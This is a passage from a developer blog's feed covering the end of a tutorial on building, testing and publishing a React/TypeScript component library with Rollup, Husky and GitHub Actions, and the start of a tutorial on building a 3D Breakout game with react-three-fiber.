class="punctuation">:</span> <span class="string">&quot;rollup -c&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build:types&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsc&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Gloria Su&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-commonjs&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^24.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-node-resolve&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^15.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@rollup/plugin-typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^11.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@types/react&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^18.0.28&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;@types/styled-components&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.1.26&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;react&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^18.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;rollup&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.15.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;styled-components&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^5.3.6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typescript&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.9.5&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tslib&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.5.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Run <em><strong>npm run build</strong></em> and <em><strong>npm run build:types</strong></em> to view the bundled results.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run build</span><br><span class="line">npm run build:types</span><br></pre></td></tr></table></figure><h2 id="Add-ts-jest"><a href="#Add-ts-jest" class="headerlink" title="Add ts-jest"></a>Add ts-jest</h2><p><strong><a href="https://github.com/kulshekhar/ts-jest">ts-jest</a></strong> simplifies the process of writing and running tests for TypeScript code, and can also make it easier for other developers to contribute to the project.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i jest ts-jest @types/jest -D</span><br><span class="line">npx ts-jest config:init</span><br></pre></td></tr></table></figure><p>Add testing scripts to the package.json file.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jest&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Create a <em><strong>test</strong></em> directory in the root folder to store test files, and run <em><strong>npm run test</strong></em> to view the status of the test cases.</p><h2 id="Husky-configuration"><a href="#Husky-configuration" class="headerlink" title="Husky configuration"></a>Husky configuration</h2><p>Use <strong><a href="tttps://link.juejin.cn/?target=https%3A%2F%2Fgithub.com%2Ftypicode%2Fhusky%2Ftree%2Fmain">Husky</a></strong> to standardize the format of commit messages, which makes it easier to generate a CHANGELOG through scripts later.<br>Firstly, add the prepare scripts to the <em><strong>package.json</strong></em> file:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;hooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;pre-commit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;npm test &amp;&amp; npm run foo&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prepare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;husky install&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm set-script prepare <span class="string">&quot;husky install&quot;</span></span><br><span class="line">npm run prepare</span><br></pre></td></tr></table></figure><p>Configure the Husky hooks in the <em><strong>package.json</strong></em> file using the husky property.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx husky add .husky/pre-commit npm <span class="built_in">test</span> &amp;&amp; npm run foo</span><br></pre></td></tr></table></figure><h2 id="Github-Action"><a href="#Github-Action" class="headerlink" title="Github Action"></a>Github Action</h2><p>GitHub Actions allows to automate your entire development workflow, from code changes to production deployment, all within the GitHub environment. The following configuration is mainly to let Github Action help us run lint and test, and when we push a tag, it will help us publish the package to npm and deploy the latest documentation.</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">dry</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">tags:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">&#x27;*&#x27;</span>           <span class="comment"># Push events to every tag not containing /</span></span><br><span class="line">  <span class="attr">pull_request:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line">  <span class="attr">workflow_dispatch:</span>       <span class="comment"># https://github.blog/changelog/2020-07-06-github-actions-manual-triggers-with-workflow_dispatch/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span>   </span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">persist-credentials:</span> <span class="literal">false</span> <span class="comment"># otherwise, the token used is the GITHUB_TOKEN, instead of your personal token</span></span><br><span class="line">          <span class="attr">fetch-depth:</span> <span class="number">0</span> <span class="comment"># otherwise, you will failed to push refs to dest repo</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span>  </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/cache@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">~/.npm</span></span><br><span class="line">          <span class="attr">key:</span> <span class="string">$&#123;&#123;</span> <span class="string">runner.os</span> <span class="string">&#125;&#125;-node-$&#123;&#123;</span> <span class="string">hashFiles(&#x27;**/package-lock.json&#x27;)</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">restore-keys:</span> <span class="string">|</span></span><br><span class="line"><span class="string">            $&#123;&#123; runner.os &#125;&#125;-node-</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">check</span> <span class="string">code</span>   </span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string">          npm run lint</span></span><br><span class="line"><span class="string">          npm run test</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">echo</span> <span class="string">&quot;//registry.npmjs.org/:_authToken=$<span class="template-variable">&#123;&#123; secrets.NPM_TOKEN &#125;&#125;</span>&quot;</span> <span class="string">&gt;</span> <span class="string">~/.npmrc</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">publish</span>                          </span><br><span class="line">        <span class="attr">if:</span> <span class="string">$&#123;&#123;contains(github.ref,</span> <span class="string">&#x27;refs/tags/&#x27;</span><span class="string">)&#125;&#125;</span>  </span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm run build</span></span><br><span class="line"><span class="string">          npm run build:types</span></span><br><span class="line"><span class="string">          npm run docs:build</span></span><br><span class="line"><span class="string">          npm publish --access public</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">deploy</span>                         </span><br><span class="line">        <span class="attr">if:</span> <span class="string">$&#123;&#123;contains(github.ref,</span> <span class="string">&#x27;refs/tags/&#x27;</span><span class="string">)&#125;&#125;</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">JamesIves/github-pages-deploy-action@4.1.1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">branch:</span> <span class="string">gh-pages</span> <span class="comment"># The branch the action should deploy to.</span></span><br><span class="line">          <span class="attr">folder:</span> <span class="string">docs/.vuepress/dist</span> <span class="comment"># The folder the action should deploy.</span></span><br></pre></td></tr></table></figure><h2 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h2><p>Update the version number of the package, and push any new tags created to the remote repository.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm version patch/tag</span><br><span class="line">git push</span><br><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure><p>Retrieve the registry URL that is configured for the local npm installation.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config get registry</span><br></pre></td></tr></table></figure><p>Log in to an npm registry with credentials which is necessary in order to publish packages to the registry.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm adduser</span><br></pre></td></tr></table></figure><p>Check whether the currently named package already exists.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm info @bk/sum@version</span><br></pre></td></tr></table></figure><p>Publish or delete a package.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br><span class="line">npm unpublish @bk/sum --force</span><br><span class="line"></span><br><span class="line">npm unpublish @bk/sum@version</span><br></pre></td></tr></table></figure><h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i bk-sum</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Sum</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@bk/sum&#x27;</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="title class_">Sum</span> a=&#123;<span class="number">2</span>&#125; b=&#123;<span class="number">3</span>&#125;/&gt;</span><br></pre></td></tr></table></figure><hr><p>References:</p><ul><li><a href="https://dev.to/siddharthvenkatesh/component-library-setup-with-react-typescript-and-rollup-onj">https://dev.to/siddharthvenkatesh/component-library-setup-with-react-typescript-and-rollup-onj</a></li><li><a href="https://juejin.cn/post/6950557086916804645#heading-0">https://juejin.cn/post/6950557086916804645#heading-0</a></li><li><a href="https://juejin.cn/post/6934507948911788045">https://juejin.cn/post/6934507948911788045</a></li></ul><p>üîç Check out my code in <a href="https://github.com/Beking0912/react-typescript-rollup-starter"><strong>github</strong></a>.<br>üìÆ If find any errors, please feel free to discuss and correct them: <a href="mailto:&#98;&#115;&#117;&#x35;&#64;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#117;">&#98;&#115;&#117;&#x35;&#64;&#x6e;&#x63;&#x73;&#117;&#46;&#x65;&#x64;&#117;</a>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/02/18/ojxUeXibkZClKzt.png&quot; alt=&quot;rollup-typescript _2_.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;In this tutorial, I‚Äôll walk you thr</summary>
      
    
    
    
    <category term="Coding" scheme="https://beking0912.github.io/categories/Coding/"/>
    
    
    <category term="React" scheme="https://beking0912.github.io/tags/React/"/>
    
    <category term="TypeScript" scheme="https://beking0912.github.io/tags/TypeScript/"/>
    
    <category term="Rollup" scheme="https://beking0912.github.io/tags/Rollup/"/>
    
    <category term="npm" scheme="https://beking0912.github.io/tags/npm/"/>
    
  </entry>
  
  <entry>
    <title>üéÆ Game Development: 3D Breakout</title>
    <link href="https://beking0912.github.io/2022/12/13/3D-Breakout-with-react-three-fiber/"/>
    <id>https://beking0912.github.io/2022/12/13/3D-Breakout-with-react-three-fiber/</id>
    <published>2022-12-14T01:27:54.000Z</published>
    <updated>2023-02-19T20:55:20.889Z</updated>
    
    <content type="html"><![CDATA[<p>Are you a fan of classic games like Breakout, but looking to add a modern twist?<br>Look no further than @react-three&#x2F;fiber, a powerful library for creating 3D graphics in React. In this tutorial, we‚Äôll explore how to use @react-three&#x2F;fiber to build a 3D version of Breakout. Let‚Äôs get started and bring Breakout into the world of 3D!<br>If you are not familiar with the game, you can play it online <a href="https://elgoog.im/breakout/">here</a> or <a href="https://www.crazygames.com/game/atari-breakout">here</a>.</p><p><img src="https://s2.loli.net/2022/12/19/c64ShNkIOVyQPHn.png" alt="breakout.png"></p><h2 id="Game-design"><a href="#Game-design" class="headerlink" title="Game design"></a>Game design</h2><ol><li>Render bricks, ball and paddle in 3D. All motion is in 2D.</li><li>The ball starts over in a random direction if it misses the paddle. </li><li>When the ball strikes sth, it should bounce off with reflected arrival angle.</li><li>User can move the paddle to the left and right. </li><li>When the ball strikes brick, it disappears. </li><li>The game ends when all bricks disappear.</li></ol><h2 id="Basic-scene"><a href="#Basic-scene" class="headerlink" title="Basic scene"></a>Basic scene</h2><p>As the <a href="https://docs.pmnd.rs/react-three-fiber/getting-started/your-first-scene">official documentation</a> said, the Canvas component does some important setup work behind the scenes: It sets up a Scene and a Camera, the basic building blocks necessary for rendering; And it renders our scene every frame, you do not need a traditional render-loop.<br>Then add some lights to the scene by putting components into canvas like ambientLight that is directly equivalent to <code>new THREE.AmbientLight()</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">Canvas</span> shadows camera=&#123;&#123; <span class="attr">position</span>: [<span class="number">0</span>, <span class="number">0</span>, -<span class="number">11</span>], <span class="attr">fov</span>: <span class="number">50</span> &#125;&#125;&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">ambientLight</span> <span class="attr">intensity</span>=<span class="string">&#123;0.3&#125;</span> /&gt;</span></span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">pointLight</span> <span class="attr">position</span>=<span class="string">&#123;[10,</span> <span class="attr">10</span>, <span class="attr">5</span>]&#125; /&gt;</span></span></span><br><span class="line">&lt;/<span class="title class_">Canvas</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="Create-bricks-ball-and-paddle"><a href="#Create-bricks-ball-and-paddle" class="headerlink" title="Create bricks, ball and paddle"></a>Create bricks, ball and paddle</h2><p>The mesh component is a basic scene object in <code>three.js</code> that is directly equivalent to <code>new THREE.Mesh()</code>, and it is used to hold the geometry and materials needed to represent a shape in 3D space. Then we can create a new mesh using a <code>BoxGeometry</code> and a <code>MeshStandardMaterial</code> which automatically attach to their parent.<br>To build the paddle, we use the <code>boxGeometry</code> component to create a 3D box geometry, and it accepts arguments include the width, height and depth of the box. Same way to build the wall.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Paddle</span>(<span class="params">&#123; args = [WIDTH, HEIGHT, DEPTH], color, position &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">name</span>=<span class="string">&quot;paddle&quot;</span> <span class="attr">position</span>=<span class="string">&#123;position&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">boxGeometry</span> <span class="attr">args</span>=<span class="string">&#123;args&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meshStandardMaterial</span> <span class="attr">color</span>=<span class="string">&#123;color&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To build the ball, we use the <code>sphereGeometry</code> component to create a sphere, and it accepts five arguments:</p><ol><li>radius: The radius of the sphere (default is 1).</li><li>widthSegments: The number of segments along the width of sphere (default 8).</li><li>heightSegments: The number of segments along the height of sphere (default 6).</li><li>phiStart: The angle at which to start creating sphere (default 0).</li><li>phiLength: The angle at which to end creating sphere (default Math.PI * 2).</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Ball</span>(<span class="params">&#123; args = [RADIUS, <span class="number">32</span>, <span class="number">32</span>], color, position &#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">mesh</span> <span class="attr">name</span>=<span class="string">&quot;ball&quot;</span> <span class="attr">position</span>=<span class="string">&#123;position&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">sphereGeometry</span> <span class="attr">args</span>=<span class="string">&#123;args&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">meshStandardMaterial</span> <span class="attr">color</span>=<span class="string">&#123;color&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">mesh</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Interaction"><a href="#Interaction" class="headerlink" title="Interaction"></a>Interaction</h2><p>The user can move the paddle left and right.<br>Unlike traditional game rules, the position of the paddle will be manipulated using a change of mouse position instead of using keyboard keys. Keeps the mouse offset a multiple of the paddle position when the user changes the position of the 3D camera by calculating the distance from the 3D camera to the paddle. And limit the paddle position interval according to the position of the left and right walls.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ref = <span class="title function_">useRef</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; camera &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="title function_">useFrame</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> distance = ref.<span class="property">current</span>.<span class="property">position</span>.<span class="title function_">distanceTo</span>(camera.<span class="property">position</span>);</span><br><span class="line">    ref.<span class="property">current</span>.<span class="property">position</span>.<span class="property">x</span> = <span class="title class_">Math</span>.<span class="title function_">max</span>(minX, <span class="title class_">Math</span>.<span class="title function_">min</span>(maxX, -state.<span class="property">mouse</span>.<span class="property">x</span> * distance));</span><br><span class="line">    ref.<span class="property">current</span>.<span class="property">position</span>.<span class="property">y</span> = y;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="3D-collision-detection"><a href="#3D-collision-detection" class="headerlink" title="3D collision detection"></a>3D collision detection</h2><h3 id="Using-AABB"><a href="#Using-AABB" class="headerlink" title="Using AABB"></a>Using AABB</h3><p>AABB stands for Axis-Aligned Bounding Box.<br>To test whether a sphere and an AABB (Axis-Aligned Bounding Box) are colliding, we can use the Separating Axis Theorem (SAT). This theorem states that if two convex shapes are not colliding, then there must exist an axis along which the two shapes are separated.<br>First check if the sphere is within the AABB‚Äôs boundaries. If it is, then the two shapes are colliding. If not, then we can use the SAT to test for a collision. To do this, we need to check if the sphere is separated from the AABB along any of the three axes (x, y, and z). If the sphere is not separated from the AABB along any of the axes, then the two shapes are colliding.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">intersect</span>(<span class="params">sphere, box</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> x = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minX</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">x</span>, box.<span class="property">maxX</span>));</span><br><span class="line">  <span class="keyword">const</span> y = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minY</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">y</span>, box.<span class="property">maxY</span>));</span><br><span class="line">  <span class="keyword">const</span> z = <span class="title class_">Math</span>.<span class="title function_">max</span>(box.<span class="property">minZ</span>, <span class="title class_">Math</span>.<span class="title function_">min</span>(sphere.<span class="property">z</span>, box.<span class="property">maxZ</span>));</span><br><span class="line">  <span class="keyword">const</span> distance = <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(</span><br><span class="line">    (x - sphere.<span class="property">x</span>) * (x - sphere.<span class="property">x</span>) +</span><br><span class="line">    (y - sphere.<span class="property">y</span>) * (y - sphere.<span class="property">y</span>) +</span><br><span class="line">    (z - sphere.<span class="property">z</span>) * (z - sphere.<span class="property">z</span>)</span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">return</span> distance &lt; sphere.<span class="property">radius</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Using-Box3-and-Sphere"><a href="#Using-Box3-and-Sphere" class="headerlink" title="Using Box3 and Sphere"></a>Using Box3 and Sphere</h3><p>We can use the <code>Box3.intersectsSphere()</code> or <code>Sphere.intersectsBox()</code> method and it returns a boolean value indicating whether the two objects are intersecting.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> box = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Box3</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(), <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>());</span><br><span class="line"><span class="keyword">const</span> sphere = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Sphere</span>(<span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Vector3</span>(), <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> isIntersecting = box.<span class="title function_">intersectsSphere</span>(sphere); <span class="comment">// or sphere.intersectsBox(box);</span></span><br></pre></td></tr></table></figure><h3 id="Using-Raycaster"><a href="#Using-Raycaster" class="headerlink" title="Using Raycaster"></a>Using Raycaster</h3><p>Create a <code>Raycaster</code> object and set its origin to the center of the sphere and its direction to the center of the box. Then create a <code>Box3</code> object and set its min and max points to the box‚Äôs corner points. Finally, call the <code>Raycaster</code>‚Äòs <code>intersectObject()</code> method passing in the <code>Box3</code> object as an argument. If the method returns a non-null value, then the sphere and the box are colliding.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; scene &#125; = <span class="title function_">useThree</span>();</span><br><span class="line"><span class="keyword">const</span> raycaster = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Raycaster</span>();</span><br><span class="line">raycaster.<span class="title function_">set</span>(position, ballDirection);</span><br><span class="line"><span class="keyword">const</span> intersects = raycaster.<span class="title function_">intersectObjects</span>(scene.<span class="property">children</span>);</span><br><span class="line"><span class="keyword">if</span> (intersects.<span class="property">length</span> &gt; <span class="number">0</span>) &#123;&#125; <span class="comment">// ball collisions</span></span><br></pre></td></tr></table></figure><p><strong>Possible problem:</strong> The main limitation of using Raycaster to test for collisions between a sphere and a box in three.js is that it is not very accurate. Raycaster can only detect collisions between two objects if the ray intersects with the surface of the object. This means that if the sphere is slightly offset from the box, the ray may not intersect with the surface of the sphere and the collision will not be detected. Additionally, Raycaster is not able to detect collisions between two objects that are moving, as the ray must be cast from a static point.</p><h2 id="Animate-the-ball"><a href="#Animate-the-ball" class="headerlink" title="Animate the ball"></a>Animate the ball</h2><p>Define speed as a constant and ballDirection as the direction of the ball‚Äôs motion on x and y. The useState hook is used to create a new Vector3 object with the initial position of (0, 0, 0). The useFrame hook is used to update the position of the Vector3 object.  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> [position, setPosition] = <span class="title function_">useState</span>(<span class="keyword">new</span> <span class="title class_">Vector3</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line"><span class="title function_">useFrame</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; x, y &#125; = ballDirection;</span><br><span class="line">    <span class="keyword">const</span> newPosition = <span class="keyword">new</span> <span class="title class_">Vector3</span>(position.<span class="property">x</span> + x * speed, position.<span class="property">y</span> + y * speed, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_">setPosition</span>(newPosition);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Randomness-in-bounces"><a href="#Randomness-in-bounces" class="headerlink" title="Randomness in bounces"></a>Randomness in bounces</h2><p>When the ball hits a wall, brick or racket, it should bounce off at a reflected angle of arrival, like Specular as follows. But there is a limitation that the ball will always bounce off the walls and blocks at the same angle, no matter where it hits. The trajectory of the ball is fixed, and there will be positions that the ball cannot reach, making the game uninteresting.</p><figure class="highlight 